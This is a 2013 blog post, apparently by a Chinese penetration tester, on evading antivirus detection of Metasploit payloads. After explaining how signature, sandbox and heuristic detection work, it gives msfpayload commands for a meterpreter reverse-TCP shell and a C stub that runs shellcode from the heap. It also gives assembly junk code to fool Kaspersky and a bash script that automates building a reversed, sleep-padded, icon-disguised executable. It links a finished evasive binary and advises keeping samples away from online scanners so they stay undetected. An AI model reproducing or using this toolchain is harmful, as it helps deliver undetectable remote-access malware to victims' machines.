<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Notes on Anti-Virus Evasion | Reverland的行知阁</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="anti-virus," />
  

  <meta name="description" content="Ok, This article is about why and how can you bypass antivirus softwares when you are using metasploit payloads. First of all, I’d like to emphasize the following things:

Don’t be stupid. Do anything">
<meta property="og:type" content="article">
<meta property="og:title" content="Notes on Anti-Virus Evasion">
<meta property="og:url" content="http://reverland.org/exploit/2013/08/13/notes-on-anti-virus-evasion/index.html">
<meta property="og:site_name" content="Reverland的行知阁">
<meta property="og:description" content="Ok, This article is about why and how can you bypass antivirus softwares when you are using metasploit payloads. First of all, I’d like to emphasize the following things:

Don’t be stupid. Do anything">
<meta property="og:updated_time" content="2015-11-15T06:01:31.507Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Notes on Anti-Virus Evasion">
<meta name="twitter:description" content="Ok, This article is about why and how can you bypass antivirus softwares when you are using metasploit payloads. First of all, I’d like to emphasize the following things:

Don’t be stupid. Do anything">

  

  
    <link rel="icon" href="/images/favicon.ico">
  

  

  <link href="/css/styles.css?v=ed12202f" rel="stylesheet">

  

  

</head>

<body>

  
    <a href="#modal-one" class="toolbox-mobile">盒子</a>
  

  <div class="post-header CENTER">
   
  <div class="toolbox">
    <a class="toolbox-entry" href="/">
      <span class="toolbox-entry-text">盒子</span>
      <i class="icon-home"></i>
    </a>
    <ul class="list-toolbox">
      
        <li class="item-toolbox">
          <a 
            class="CIRCLE" 
            href="/archives/"
            target="_self"
            >
            博客
          </a>
        </li>
      
        <li class="item-toolbox">
          <a 
            class="CIRCLE" 
            href="/category/"
            target="_self"
            >
            分类
          </a>
        </li>
      
        <li class="item-toolbox">
          <a 
            class="CIRCLE" 
            href="/tag/"
            target="_self"
            >
            标签
          </a>
        </li>
      
        <li class="item-toolbox">
          <a 
            class="CIRCLE" 
            href="/link/"
            target="_self"
            >
            友链
          </a>
        </li>
      
        <li class="item-toolbox">
          <a 
            class="CIRCLE" 
            href="/about/"
            target="_self"
            >
            关于
          </a>
        </li>
      
        <li class="item-toolbox">
          <a 
            class="CIRCLE" 
            href="/atom.xml"
            target="_blank"
            >
            RSS
          </a>
        </li>
      
    </ul>
  </div>


</div>


  <div id="toc" class="toc-article">
    <strong class="toc-title">文章目录</strong>
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Theory:_How_Antivirus_software_works"><span class="toc-text">Theory: How Antivirus software works</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Signature-based_Detection"><span class="toc-text">Signature-based Detection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sandbox"><span class="toc-text">Sandbox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Heuristic"><span class="toc-text">Heuristic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Experiment_on_bypass_Antivirus_software"><span class="toc-text">Experiment on bypass Antivirus software</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-text">Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FootNotes"><span class="toc-text">FootNotes</span></a></li></ol>
  </div>



<div class="content content-post CENTER">
   <article id="post-notes-on-anti-virus-evasion" class="article article-type-post" itemscope itemprop="blogPost">
  <header class="article-header">
    <h1 class="post-title">Notes on Anti-Virus Evasion</h1>

    <div class="article-meta">
      <span>2013-08-13</span>

      <span> | </span>

      <span class="article-author">Liu Yuyang</span>

      <span> | </span>

      
  <span class="article-category">
    <a class="article-category-link" href="/categories/exploit/">exploit</a>
  </span>


    </div>
  </header>

  <div class="article-content">
    
      <p>Ok, This article is about why and how can you bypass antivirus softwares when you are using metasploit payloads. First of all, I’d like to emphasize the following things:</p>
<ol>
<li>Don’t be stupid. Do anything at your own risk.</li>
<li>There is nothing too hard to learn. If you find something really hard to understand. <a href="http://www.offensive-security.com/when-things-get-tough/" target="_blank" rel="external">Try harder</a>, you may lack of some necessary requirements, please refer to References section yourself. </li>
<li>There are lots of Unix tools to use for linux, so I use gentoo linux as my experiment environment. You can use anything you like.</li>
<li>I’m not a native English speaker, but I hope this article is interesting and useful to many non-Chinese speakers. So I write every word in a language I’m not familiar. The article may full with grammer mistakes, but you can understand what I’m saying is enough. Happy hacking.</li>
<li>Last but not least, Never upload your samples to a online scanner website like virustotal or so if you are a penetration tester and want to use your payload later. Check it on your local machine. you can alse try <a href="http://vscan.novirusthanks.org/" target="_blank" rel="external">novirusthanks</a> with <code>Do not distribute the sample</code> marked.</li>
</ol>
<h2 id="Theory:_How_Antivirus_software_works">Theory: How Antivirus software works</h2><h3 id="Signature-based_Detection">Signature-based Detection</h3><p>Why can you bypass AV detection? There won’t much way for AV vendors to decide whether a software is a normal program or a malware. They have 3 main ways, the most popular method it use to scan malwares is based on signature. AV engines scan the whole program to find something in accordance with the kown ‘bad strings’ in malwares. Once ‘bad strings’ being found, the program will be flagged as a malware.</p>
<p>You will soon see it is so. Lets take <a href="http://www.avast.com/" target="_blank" rel="external">Avast!</a> free edition as example. I do all my test on my linux machine, but you can do anything as you like.</p>
<p>First, Let’s use a <code>windows/meterpreter/reverse_tcp</code> payload from <a href="http://metasploit.com/" target="_blank" rel="external">Metasploit</a>. It will provide a reverse meterpreter shell to a remote computer for the hackers.</p>
<pre><code>~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> X &gt; payload.exe
</code></pre><p>Start a listenner and assert it really works</p>
<pre><code><span class="tag">wine</span> <span class="tag">payload</span><span class="class">.exe</span>
</code></pre><p>However, Avast! will find its a malware! Moreover, even when you open the file explorer, the payload will be found before any scan.</p>
<p>To my surprise, Avast! will flag the binary files(Non-execute files) as malwares too. So it look like it use some ‘signature’ to judge whether a program is malicious or not. But, what’s the signature?</p>
<p>To find out the ‘bad string’, I use the old bisection method to locate where the signature really is:</p>
<pre><code>~/metasploit-framework/msfpayload windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> R &gt; payload_raw
cat payload_raw | cut -c614-<span class="number">663</span> &gt; malicious.txt
</code></pre><p>Ok, then I get the ‘bad string’ into <code>malicious.txt</code>. Scan it with Avast!, Avast! flag it as malware. You can download it <a href="https://github.com/reverland/scripts/blob/master/else/malicious.txt" target="_blank" rel="external">here</a> and test it with your own avast.</p>
<p>Now we are sure AV softwares use signature to find malwares. It is true, whenever a new suspicious files uploaded to AV vendors(for example, upload it to <a href="https://www.virustotal.com/" target="_blank" rel="external">Virustotal</a>), the new malware’s signature will be soon added to the virus signature database soon.</p>
<p>But thats not all.</p>
<p>There are other thing AV vendors use to detect malware. For metasploit is too famous in penetration testers’ group and other groups, AV softwares begin to detect whether the software is created with it. As a result, even if its not a malware, much AV will still flag your metasploit-created program as malware. You may check the <a href="http://www.intelligentexploit.com/articles/Metasploit:-Low-Level-View.pdf" target="_blank" rel="external">Metasploit: Low Level View</a> to learn more.</p>
<p>Seeing is believing. Let’s use metasploit framework to generate a program with no payload[^1]:</p>
<pre><code><span class="keyword">echo</span> -ne | ~/metasploit-framework/msfencode -<span class="keyword">e</span> generic/none -<span class="keyword">k</span> -<span class="keyword">x</span> calc.<span class="keyword">exe</span> -<span class="keyword">t</span> <span class="keyword">exe</span> -<span class="keyword">o</span> calc_no_payload.<span class="keyword">exe</span>
</code></pre><p>However, Avast! mark it as a threat <code>Win32 Rozpatch</code>, most AVs will detect it as malwares or simply virus as well, you can upload it to <a href="http://metascan-online.com/" target="_blank" rel="external">metascan</a> to check it.</p>
<p>What does that mean? You should use another way to generate programs if you won’t like your program to be detected.</p>
<p>In a word, Metasploit project are so well-known that nearly all it’s encoders and ways to generate programs are well researched. The encoder stub are simply to detect, the strange entrypoint to a rwx section are simply to detect. Much AVs are just detect these things rather than the real ‘bad signature’. Then we know we must use our own way to generate programs.</p>
<h3 id="Sandbox">Sandbox</h3><p>However, sandbox becomes more and more popular. Whenever a suspicious program runs, it will be comfined to a virtual sandbox environment. If they do something that can be flagged as malicious, the program will soon be marked as malware. Some AV will scan suspicious programs in this way. However, sandbox will take up too much system resources, it will only run it in sandbox for only little time than release it.</p>
<p>So malware authors begin to sleep or do some useless loops to pass the sandbox time. However, some AVs begin to flag program has the strange sleep and loops as malwares as a countermeasure.</p>
<p>The next example is to demonstrate this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">/* test for malwares */</span></span><br><span class="line"><span class="keyword">char</span> code[] = </span><br><span class="line"><span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i,j;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">100</span>;j++)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"wait..."</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>Then compile and link it.</p>
<pre><code>✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/bypassav ⮀ wine ~/</span>.wine<span class="regexp">/drive_c/</span>lcc<span class="regexp">/bin/</span>lcc test.c -o test.o
✘ ⮀ ~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/bypassav ⮀ wine ~/</span>.wine<span class="regexp">/drive_c/</span>lcc<span class="regexp">/bin/</span>lcclnk.exe test.o -o test.exe
</code></pre><p>Then I upload it to metascan, 3 AVs mark it as malware though its nothing. The report is <a href="https://www.metascan-online.com/en/scanresult/file/bb96f4ab4ed74ae1b8766a6762b42470" target="_blank" rel="external">here</a></p>
<p>So you may have to use other ways to avoid these avs. Fortunately, there are tons of method to do this.(May not fortunate : ( )</p>
<h3 id="Heuristic">Heuristic</h3><p>When I try to bypass Kaspersky, It will always mark my deliberate payload with its heuristic engine. It’s really frustrating. You don’t know how heuristic works. At first I guess its something check special things like for-loop talked above in programs. So I remove my shellcode. It passed Kaspersky. I add my shellcode but not run it, it passed too. Then I noticed Kaspersky takes more time than other AVs to scan a sample. So I guess it may use a sandbox to check programs. However, when I use some sleep/for-loop tricks kaspersky will still mark my malware out. I check whether kaspersky will mark the sleep/for-loop section as malware, it didn’t.</p>
<p>So, that’s strange. How heuristic works? </p>
<p>After search on google, I find that kaspersky’s heuristic engine may check the windows api call of a program without running it. I remember <em>Metasploit: Low Level View</em> once said:</p>
<blockquote>
<p>Two effective methods are used to detect Polymorphic and Metamorphic</p>
<p>malware are :</p>
<p>− SAVE</p>
<p>on SAVE method a sequence of windows API calls are checked which<br>represent the signature of a malware. To decide whether a file is infected or<br>not; The ecludian distance between every API call is calculated. And if the<br>avg. of the API calls distances is less than 10% then a file is flagged as<br>infected. This implies on the (disk-level) injected code probably to be<br>detected</p>
<p>− Semantic aware</p>
<p>Here signatures are represented as control flow or tuples on instruction, on<br>disk-level a program is disassembled and a control flow is generated and<br>then compared to the signatures control flows and decided whether a<br>program is infected or not.</p>
</blockquote>
<p>No matter which method, you can simply disassemble metasploit’s payload and add some strange calls or jmps to confuse the heuristic engine. And I succeed fool Kaspersky just with a little simple <code>loop</code>:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">    push ecx&#10;    add ecx,0x100&#10;    push eax&#10;xxx:&#10;    imul eax, 0x100&#10;    xor eax, eax&#10;    loop xxx</span><br></pre></td></tr></table></figure>
<p>The next section is my experiment and some scan report.</p>
<h2 id="Experiment_on_bypass_Antivirus_software">Experiment on bypass Antivirus software</h2><p>I want to bypass all av with metasploit generated payload. this is my program template to inject payload:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">/* shellprogram.c */</span></span><br><span class="line"><span class="keyword">char</span> code[] = </span><br><span class="line"><span class="string">"&lt;payload here&gt;"</span></span><br><span class="line"><span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> (*exeshell)();</span><br><span class="line">    exeshell = (<span class="keyword">int</span> (*)()) code;</span><br><span class="line">    (<span class="keyword">int</span>)(*exeshell)();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>To avoid the signature detection of the well-known metasploit payload, You can disassemble it and add random non-sense instructions(for example， push and pop) to make the binary different from the original one. You can simply write a script to automatic this like I do.[^2] Finally, get the new C style shellcode.</p>
<pre><code><span class="regexp">~/Work/</span>project<span class="regexp">/bypassav ⮀ ~/</span>metasploit-framework<span class="regexp">/msfpayload windows/</span>shell/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.56</span><span class="number">.102</span> R &gt; shell_reverse_raw
<span class="regexp">~/Work/</span>project/bypassav ⮀ python ndisasm.py shell_reverse_raw &gt; ghost-writing.asm
<span class="regexp">~/Work/</span>project/bypassav ⮀ nasm ghost-writing.asm -o <span class="keyword">new</span>
<span class="regexp">~/Work/</span>project<span class="regexp">/bypassav ⮀ od -tx1 test.o | cut -c8-80 | sed -e 's/</span> <span class="regexp">/\\x/</span>g<span class="string">' | sed -e '</span>s<span class="regexp">/^/</span><span class="string">"/g' | sed -e 's/$/"</span>/g<span class="string">'</span>
</code></pre><p>Bypass all AVs’ detection is a challenge, for to avoid one AV you may trigger another one. The program above will bypass most but Asquared.</p>
<p>Why? I try to remove my shellcode just test the template, It will still be marked by avs. You can check the report <a href="http://vscan.novirusthanks.org/analysis/684ebdecaf29c41841833d9738c4ccac/Yy1ub25lLWV4ZQ==/" target="_blank" rel="external">here</a> and <a href="http://r.virscan.org/report/d35e77a1472bea0119ca8d1ec56d7b1a.html" target="_blank" rel="external">here</a></p>
<p>So it looks like execute from the data section is suspicious! There must many people use this tricks!</p>
<p>So I decided to copy it to heap and execute shellcode from heap.</p>
<p><a href="http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/" target="_blank" rel="external">No shellcode and execute from heap</a>, No AV mark it as malicious. Another <a href="https://www.metascan-online.com/en/scanresult/file/dc5c7080fc44495f880facfdfc2b9eb1" target="_blank" rel="external">Report here</a></p>
<p>So, move your modified shellcode(You must Modified it so won’t be checked before execution) to heap and execute from heap. However, some AVs can detect it, here’s the <a href="https://www.metascan-online.com/en/scanresult/file/e3442be2dd0f4a089a2c16db2d387880" target="_blank" rel="external">report</a> and <a href="http://vscan.novirusthanks.org/analysis/312caba7ca97f0b0b6deee4e0ebb2b7a/Yy1zaGVsbC1yZXZlcnNlLW5hc20taGVhcC1ndy11/" target="_blank" rel="external">another one</a>.</p>
<p>make the modified upsidedown won’t bypass it and the name it marked never change. So I doubt these avs use sandbox to detect my shellcode.</p>
<p>So I add some sleep/for-loop to fool them. As mentioned earlier, you’d better try more find a slitely deferent way to fool them. It may work, but it may trigger other detection technichs.</p>
<p>After several tries and errors, I bypass all but Kaspersky. After several tries I know its not sandbox and signature. Then the story has been write earlier in this article.</p>
<p>The final bypass all report is <a href="https://www.metascan-online.com/en/scanresult/file/df3906541f8846f9a5ef38c7e31505e9" target="_blank" rel="external">here</a> You can download from <a href="https://github.com/reverland/scripts/blob/master/exe/hahaha.exe" target="_blank" rel="external">here</a> to check it(LHOST 192.168.56.102, windows/meterpreter/reverse_tcp, LPORT=4444, md5sum listed is in metascan)</p>
<p>Another thing to mention, I just upload it to virusnothanks when I did my experiments, for I don’t want to make the experiment uncerntainly. But now upload to anywhere is ok. If you want to do some experiments for several days, do not upload it to virustotal or metascan or viruscan and so on. You suspicious payload will be marked in one day.(Kaspersky really mark my payload in one day!)</p>
<p>I finally write scripts which generate random instructions for assemble language, encrypt or simply upsidedown shellcodes and automatic the whole process to facilitate my work. you can try one yourself. Similar to this one:</p>
<pre><code><span class="comment"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="shebang">#! /bin/env bash</span></span><br><span class="line">nasm -fbin <span class="string">"<span class="variable">$1</span>"</span> -o test.o</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line">/* shellprogram.c */</span><br><span class="line">char code[] = </span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">LEN=`wc -c test.o| cut <span class="operator">-d</span><span class="string">' '</span> <span class="operator">-f</span>1`</span><br><span class="line">python upsidedown.py test.o</span><br><span class="line">od -tx1 test.o | cut -c8-<span class="number">80</span> | sed <span class="operator">-e</span> <span class="string">'s/ /\\x/g'</span> | sed <span class="operator">-e</span> <span class="string">'s/^/"/g'</span> | sed <span class="operator">-e</span> <span class="string">'s/$/"/g'</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"\"\";"</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line">int add(int);</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  int i, len, s;</span><br><span class="line">  char *p;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">str=<span class="string">'len = '</span><span class="variable">$&#123;LEN&#125;</span><span class="string">';'</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;str&#125;</span> &gt;&gt; test.c</span><br><span class="line"></span><br><span class="line">cat &gt;&gt; test.c &lt;&lt; EOF_FLAG</span><br><span class="line">  p = (char *)malloc(len);</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">  s = add(i);</span><br><span class="line">  sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      p[i] = code[len - <span class="number">1</span> - i];</span><br><span class="line">    &#125;</span><br><span class="line">    int (*exeshell)();</span><br><span class="line">    exeshell = (int (*)()) p;</span><br><span class="line">    (int)(*exeshell)();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">int add(int num)</span><br><span class="line">&#123;</span><br><span class="line">static int sn;</span><br><span class="line">sn+=num;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">10000</span>) <span class="built_in">return</span> sn;</span><br><span class="line">add(++num);</span><br><span class="line">&#125;</span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># test.rc</span></span><br><span class="line">cat &gt;&gt; test.rc &lt;&lt; EOF_FLAG</span><br><span class="line"><span class="number">1</span> ICON <span class="string">"test.ico"</span></span><br><span class="line">EOF_FLAG</span><br><span class="line"></span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lcc.exe test.c -o test.obj</span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lrc.exe test.rc /otest.res</span><br><span class="line">wine ~/.wine/drive_c/lcc/bin/lcclnk.exe test.obj test.res -o test.exe</span><br><span class="line">i686-pc-mingw32-strip test.exe</span><br><span class="line"></span><br><span class="line">rm test.o</span><br><span class="line">rm test.rc</span><br><span class="line">rm test.obj</span><br><span class="line">rm test.res</span><br><span class="line">rm test.c</span><br><span class="line"><span class="comment">#rm test_encode.o</span></span><br><span class="line"><span class="comment">#wine test.exe</span></span><br><span class="line"><span class="comment">#rm test.exe</span></span><br></pre></td></tr></table></figure></span>
</code></pre><h2 id="Conclusion">Conclusion</h2><p>Theory about how AV detect are easy to understand and bypass, but AV vendors will also exert to detect malwares. Some may useful, some may outdated. These techs are sprayed among the Reference section, you can also google more. I don’t talk about it much. The world is changing quickly(especially for security), check it by yourselves.</p>
<p>Finally you will see, the most effective way to avoid any AV, however, is to write your own tools or use them your own way. All you need is just to be creative. </p>
<p>Last, I’ll recommend <a href="https://github.com/ChrisTruncer/Veil/" target="_blank" rel="external">Veil</a> to you. It’s really a amazing tool for penetration testers.</p>
<p>Lastly, Chinese: 英文作文真难写……</p>
<h2 id="Reference">Reference</h2><p>You can find more below and special thanks to them:</p>
<ul>
<li><a href="http://funoverip.net/2011/04/100pc-anti-virus-evasion-with-metasploit-browser-exploits-from-ms11-003/" target="_blank" rel="external">100% Anti-Virus evasion with Metasploit browser exploits(example with ms11-003)</a></li>
<li><a href="http://pen-testing.sans.org/blog/pen-testing/2013/07/12/anti-virus-evasion-a-peek-under-the-veil" target="_blank" rel="external">Anti-Virus Evasion: A Peek Under the Veil</a></li>
<li><a href="http://spareclockcycles.org/tag/antivirus-evasion/" target="_blank" rel="external">Avoiding AV Detection</a></li>
<li><a href="http://www.commonexploits.com/?p=789" target="_blank" rel="external">AV0id – Anti-Virus Bypass Metasploit Payload Generator Script</a></li>
<li><a href="http://www.abysssec.com/blog/2011/09/25/bypassing-all-anti-virus-in-the-world-good-bye-detection-hello-infection/" target="_blank" rel="external">bypassing all anti-virus in the world (Good Bye Detection , Hello Infection)</a></li>
<li><a href="http://carnal0wnage.attackresearch.com/2010/03/msfencode-msfpayload-into-existing.html" target="_blank" rel="external">Msfencode a Msfpayload Into An Existing Executable</a></li>
<li><a href="http://carnal0wnage.attackresearch.com/2011/07/process-injection-outside-of-metasploit.html" target="_blank" rel="external">Process Injection Outside of Metasploit</a></li>
<li><a href="http://pen-testing.sans.org/resources/papers/gcih/effectiveness-antivirus-detecting-metasploit-payloads-106563" target="_blank" rel="external">Effectiveness of Antivirus in Detecting Metasploit’s Payloads</a></li>
<li><a href="https://community.rapid7.com/community/metasploit/blog/2013/01/17/evading-anti-virus-detection--whiteboard-wednesday" target="_blank" rel="external">Evading Anti-Virus Detection - Whiteboard Wednesday</a></li>
<li><a href="http://schierlm.users.sourceforge.net/avevasion.html" target="_blank" rel="external">Facts and myths about antivirus evasion with Metasploit</a></li>
<li><a href="https://community.rapid7.com/community/metasploit/blog/2012/12/14/the-odd-couple-metasploit-and-antivirus-solutions" target="_blank" rel="external">The Odd Couple: Metasploit and Antivirus Solutions</a></li>
<li><a href="http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/" target="_blank" rel="external">Using Metasm To Avoid Antivirus Detection (Ghost Writing ASM)</a></li>
<li><a href="http://pen-testing.sans.org/blog/2011/10/13/tips-for-evading-anti-virus-during-pen-testing" target="_blank" rel="external">Tips for Evading Anti-Virus During Pen Testing</a></li>
<li><a href="http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/" target="_blank" rel="external">Why Encoding Does not Matter and How Metasploit Generates EXE’s</a></li>
<li><a href="http://www.exploit-db.com/download_pdf/17968" target="_blank" rel="external">Evading Antimalware Engines via Assembly Ghostwriting</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_63a4534c01012ugj.html" target="_blank" rel="external">分析卡巴斯基启发式扫描及其绕过方案(Chinese)</a></li>
</ul>
<h2 id="FootNotes">FootNotes</h2><p>[^1]: Example comes from <a href="http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/" target="_blank" rel="external">http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/</a><br>[^2]: Thanks to the article on <a href="http://www.pentestgeek.com/2012/01/25/using-metasm-to-avoid-antivirus-detection-ghost-writing-asm/#comment-513" target="_blank" rel="external">Pentest Geek</a>, however, nasm may a better choice. for there won’t be piles of <code>db</code>s</p>

    
  </div>
</article>

</div>


  <a id="backTop" class="back-top">
    <i class="icon-angle-up"></i>
  </a>




  <div class="modal" id="modal-one" aria-hidden="true">
  <a href="#close" class="cover" aria-hidden="true"></a>
  <div class="modal-dialog">
    <div class="modal-header">
      <a href="#close" class="btn-close" aria-hidden="true">关闭</a>
    </div>
    <div class="modal-body">
      <ul class="list-toolbox">
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/archives/"
              target="_self"
              >
              博客
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/category/"
              target="_self"
              >
              分类
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/tag/"
              target="_self"
              >
              标签
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/link/"
              target="_self"
              >
              友链
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/about/"
              target="_self"
              >
              关于
            </a>
          </li>
        
          <li class="item-toolbox">
            <a
              class="CIRCLE"
              href="/atom.xml"
              target="_blank"
              >
              RSS
            </a>
          </li>
        
      </ul>

    </div>
  </div>
</div>



  
      <div class="fexo-comments comments-post">
    
  <section class="disqus-comments">
    <div id="disqus_thread">
      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    </div>
  </section>

  <script>
    var disqus_shortname = 'reverlandblog';
    
    var disqus_url = 'http://reverland.org/exploit/2013/08/13/notes-on-anti-virus-evasion/';
    
    (function(){
      var dsq = document.createElement('script');
      dsq.type = 'text/javascript';
      dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>


    




  </div>

  

  <script type="text/javascript">
  function loadScript(url, callback) {
    var script = document.createElement('script')
    script.type = 'text/javascript';

    if (script.readyState) { //IE
      script.onreadystatechange = function() {
        if (script.readyState == 'loaded' ||
          script.readyState == 'complete') {
          script.onreadystatechange = null;
          callback();
        }
      };
    } else { //Others
      script.onload = function() {
        callback();
      };
    }

    script.src = url;
    document.getElementsByTagName('head')[0].appendChild(script);
  }

  window.onload = function() {
    loadScript('/js/fastclick.js', function() {
      loadScript('/js/app.js', function() {
        // load success
      });
    });
  }
</script>

</body>
</html>
